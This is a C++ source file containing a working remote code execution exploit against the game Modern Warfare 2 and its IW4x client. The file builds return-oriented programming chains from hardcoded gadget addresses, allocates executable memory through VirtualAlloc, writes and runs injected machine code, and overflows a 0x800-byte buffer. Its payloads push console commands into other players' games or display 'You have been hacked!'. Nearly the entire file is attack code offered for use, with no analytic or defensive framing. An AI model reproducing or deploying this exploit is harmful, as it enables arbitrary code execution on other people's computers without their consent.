#include "STDInclude.hpp"

#include "Game/MW2/Exploit.hpp"

#ifdef USE_IW4X

#define UNUSED_MEMORY_POINTER 0x64A3050
#define UNUSED_DATA_POINTER 0x64A3071
#define RESTORE_SERVER_CONTEXT 0x4B2412

#define ORG_PARAM 0x31D9390

#else

#define UNUSED_MEMORY_POINTER 0x642D718
#define UNUSED_DATA_POINTER 0x642D964
#define UNUSED_DATA_POINTER2 0x642D848
#define RESTORE_SERVER_CONTEXT 0x56A092

#define ORG_PARAM 0x3172010

#endif

namespace Game
{
	namespace MW2
	{
#pragma optimize("", off)
		__declspec(naked) void Exploit::HudElementStub()
		{
			__asm
			{
				push 0
				push 2047

				mov eax, 5293E0h // HudElem_Alloc
				call eax

				pop ebx
				pop ebx

				mov dword ptr[eax], 1 // type (text)
				mov dword ptr[eax + 20], 40000000h //3F800000h // font scale (1.0f)
				mov dword ptr[eax + 52], 0FF000000h // color
				//mov dword ptr[eax + 56], 0FF00FF00h // from color
				mov dword ptr[eax + 140], 07F00FF00h // glow color

				xor ecx, ecx
				mov dword ptr[eax + 72], ecx
				mov dword ptr[eax + 68], ecx
				mov dword ptr[eax + 80], ecx
				mov dword ptr[eax + 76], ecx
				mov dword ptr[eax + 88], ecx
				mov dword ptr[eax + 84], ecx
				mov dword ptr[eax + 92], ecx
				mov dword ptr[eax + 108], ecx
				mov dword ptr[eax + 104], ecx
				mov dword ptr[eax + 116], ecx
				mov dword ptr[eax + 112], ecx
				mov dword ptr[eax + 124], ecx
				mov dword ptr[eax + 120], ecx
				mov dword ptr[eax + 132], ecx
				mov dword ptr[eax + 128], ecx

				// Typewriter effect
				/*mov ecx, ds:1B4B884h // Get level time

				mov dword ptr[eax + 144], ecx
				mov dword ptr[eax + 148], 100    // letter speed
				mov dword ptr[eax + 152], 120000 // decay delay - 2 minutes
				mov dword ptr[eax + 156], 600    // decay speed*/

				// Fade color
				//mov[eax + 56], ecx // Start time
				//mov[eax + 60], edx // Duration

				push eax
				push [esp + 8h]

				mov eax, 54D490h // G_LocalizedStringIndex
				call eax

				pop ebx
				pop ebx

				mov [ebx + 132], eax
				or byte ptr[ebx + 164], 1

				retn

				// Endmarker
				nop
				nop
				nop
				nop
			}
		}
#pragma optimize("", on)

		void Exploit::spawnHudElement(std::vector<DWORD>* stack)
		{
			this->writeData(stack, UNUSED_DATA_POINTER, "You have been hacked!");
			this->callFunction(stack, UNUSED_MEMORY_POINTER, Exploit::HudElementStub, 1, UNUSED_DATA_POINTER);
		}

		void Exploit::allocateMemory(std::vector<DWORD>* stack, DWORD address, DWORD size)
		{
			// Allocate executable memory
			stack->push_back(0x401000 + 0x00077a0a);    // pop esi
			stack->push_back(0x67D1E4);                 // IAT: VirtualAlloc

			stack->push_back(0x401000 + 0x0017f5c8);    // mov eax, [esi]; pop esi
			stack->push_back(0);                        // padding

			stack->push_back(0x401000 + 0x000ded54);    // jmp eax

			stack->push_back(0x401000 + 0x00077a0a);    // pop esi - for saving the memory pointer

			stack->push_back(0);                        // addr
			stack->push_back(size);                     // size
			stack->push_back(MEM_COMMIT | MEM_RESERVE); // addr
			stack->push_back(PAGE_EXECUTE_READWRITE);   // permissions

													    // Save memory pointer
			stack->push_back(address);                  // Target address
			stack->push_back(0x401000 + 0x00193450);    // mov [esi], eax
		}

		void Exploit::writeDataInEax(std::vector<DWORD>* stack, std::string data)
		{
			while (data.size() % 4) data.push_back(0);
			for (size_t i = 0; i < data.size(); i += 4)
			{
				stack->push_back(0x401000 + 0x000021a1);    // pop ecx
				stack->push_back(*PDWORD(data.data() + i)); // data
				stack->push_back(0x401000 + 0x00029059);    // mov [eax], ecx
				stack->push_back(0x401000 + 0x00254ab9);    // add eax, 3
				stack->push_back(0x401000 + 0x00064844);    // add eax, 1
			}
		}

		void Exploit::freeMemory(std::vector<DWORD>* stack, DWORD address)
		{
			stack->push_back(0x401000 + 0x00249982); // pop edx
			stack->push_back(address);

			stack->push_back(0x401000 + 0x001ccb8c); // mov eax, [edx]

			stack->push_back(0x401000 + 0x00249982); // pop edx
			stack->push_back(0x5B7880); // Z_VirtualFreeInternal

			stack->push_back(0x401000 + 0x00000039); // mov [esp + 4], eax; jmp edx

			this->pop(stack, 1);
			stack->push_back(0); // placeholder
		}

		void Exploit::writeFunction(std::vector<DWORD>* stack, DWORD address, void* function)
		{
			size_t length = 0;
			for (length = 0;; ++length)
			{
				DWORD val = *PDWORD(PBYTE(function) + length);
				if (val == 0x90909090 || val == 0xCCCCCCCC)
				{
					break;
				}
			}

			std::string data(LPSTR(function), length);
			this->allocateMemory(stack, address, data.size());
			this->writeDataInEax(stack, data);
		}

		void Exploit::callFunction(std::vector<DWORD>* stack, DWORD address, void* function, DWORD paramCount, ...)
		{
			if (function) this->writeFunction(stack, address, function);

			stack->push_back(0x401000 + 0x00249982); // pop edx
			stack->push_back(address);
			stack->push_back(0x401000 + 0x001ccb8c); // mov eax, [edx]

			stack->push_back(0x401000 + 0x000ded54); // jmp eax

			if (paramCount > 0)
			{
				this->pop(stack, paramCount);
				for (DWORD i = 0; i < paramCount; ++i)
				{
					stack->push_back((&paramCount)[i + 1]);
				}
			}

			if (function) this->freeMemory(stack, address);
		}

		void Exploit::pop(std::vector<DWORD>* stack, size_t params)
		{
			DWORD popOffsets[] =
			{
#ifdef USE_IW4X
				0x0000007d, // 0
				0x002aa192, // 1
				0x00136818, // 2
				0x000090fe, // 3
				0x00100f7e, // 4
				0x002c905c, // 5
				0x002c905b, // 6
#else
				0x000000a9, // 0
				0x00249982, // 1
				0x000236c2, // 2
				0x000b8d2c, // 3
				0x0009dfb2, // 4
				0x0000c9f2, // 5
				0x0026afab, // 6
#endif
			};

			if(params >= ARRAYSIZE(popOffsets)) throw std::runtime_error("Unsupported parameter count");
			stack->push_back(0x401000 + popOffsets[params]);
		}

		void Exploit::quit(std::vector<DWORD>* stack)
		{
			// ExitProcess
			stack->push_back(0x5C96BA);
		}

		void Exploit::restore(std::vector<DWORD>* stack)
		{
			stack->push_back(RESTORE_SERVER_CONTEXT);
		}

		void Exploit::writeData(std::vector<DWORD>* stack, DWORD address, std::string data)
		{
			data.push_back(0);
			while (data.size() % 4) data.push_back(0);

			stack->push_back(0x401000 + 0x00077a0a); // pop esi

			for (unsigned int i = 0; i < data.size(); i += 4)
			{
				stack->push_back(*(DWORD*)(data.data() + i));
				stack->push_back(0x401000 + 0x000421fe); // pop eax
				stack->push_back(address + i);
				stack->push_back(0x401000 + 0x00077a08); // mov [eax], esi; pop esi
			}

			stack->push_back(0);
		}

		std::string Exploit::buildPayload(int num)
		{
			std::vector<DWORD> stack;

#ifdef USE_IW4X
			num;
#else
			this->freeMemory(&stack, UNUSED_MEMORY_POINTER);

			if (num == 0)
			{
				this->writeData(&stack, UNUSED_DATA_POINTER,
					"player_sprintSpeedScale 5\n"
					"player_sprintUnlimited 1\n");

				stack.push_back(0x563BA0); // Cbuf_AddText
				this->pop(&stack, 2);
				stack.push_back(0);
				stack.push_back(UNUSED_DATA_POINTER);
			}
			else if (num == 1)
			{
				this->writeData(&stack, UNUSED_DATA_POINTER,
					"player_sprintSpeedScale 1.5\n"
					"player_sprintUnlimited 0\n");

				stack.push_back(0x563BA0); // Cbuf_AddText
				this->pop(&stack, 2);
				stack.push_back(0);
				stack.push_back(UNUSED_DATA_POINTER);
			}
			else if (num == 2)
			{
				this->spawnHudElement(&stack);
			}
			else if (num == 3)
			{
				this->writeData(&stack, UNUSED_DATA_POINTER,
					"scr_war_score_kill 2516000\n"
					"scr_war_score_suicide 2516000\n");

				stack.push_back(0x563BA0); // Cbuf_AddText
				this->pop(&stack, 2);
				stack.push_back(0);
				stack.push_back(UNUSED_DATA_POINTER);
			}
			else if (num == 4)
			{
				this->writeData(&stack, UNUSED_DATA_POINTER,
					"player_meleeRange 99999\n");

				stack.push_back(0x563BA0); // Cbuf_AddText
				this->pop(&stack, 2);
				stack.push_back(0);
				stack.push_back(UNUSED_DATA_POINTER);
			}
			else if (num == 5)
			{
				this->writeData(&stack, UNUSED_DATA_POINTER, "mp_terminal");

				stack.push_back(0x5BE730);            // Dvar_SetStringByName
				this->pop(&stack, 2);
				stack.push_back(0x68F69C);            // 'ui_mapname'
				stack.push_back(UNUSED_DATA_POINTER); // mapname

				stack.push_back(0x563C50);            // Cbuf_AddCall
				this->pop(&stack, 2);
				stack.push_back(0);
				stack.push_back(0x59BCD0);            // UI_Map
			}

			this->restore(&stack);
#endif

			std::vector<DWORD> fixup;
			this->pop(&fixup, 1);
			fixup.push_back(ORG_PARAM); // old param? not really, but whatever

			const char safetyBytes = 8;
#ifdef USE_IW4X
			fixup.push_back(0x402500); // Com_Printf
			this->pop(&fixup, 3);
			fixup.push_back(0);
			fixup.push_back(0x72CCB0);
			fixup.push_back(0x6FC630);

			this->restore(&fixup);
#else
			static unsigned char shellcodeTemplate[] =
			{
				0x81, 0xEC, 0x70, 0x08, 0x00, 0x00, // sub esp, 870h
				0xC3                                // retn
			};

			std::string shellcode((char*)shellcodeTemplate, sizeof shellcodeTemplate);
			shellcode[2] -= safetyBytes;

			this->allocateMemory(&fixup, UNUSED_MEMORY_POINTER, shellcode.size());
			this->writeDataInEax(&fixup, shellcode);

			// Execute shellcode
			fixup.push_back(0x401000 + 0x00249982); // pop edx
			fixup.push_back(UNUSED_MEMORY_POINTER);
			fixup.push_back(0x401000 + 0x001ccb8c); // mov eax, [edx]

			fixup.push_back(0x401000 + 0x000ded54); // jmp eax
#endif

			std::string data;
			for (char i = 0; i < safetyBytes; ++i) data.push_back(0);

			data.append(LPSTR(stack.data()), stack.size() * 4);
			data.resize(0x800); // Exceed 0x800 bytes
			data.append(LPSTR(fixup.data()), fixup.size() * 4);

			if (stack.size() * 4 > (0x800 - safetyBytes)) throw std::runtime_error("Exceeded buffer size!");

			return data;
		}
	}
}
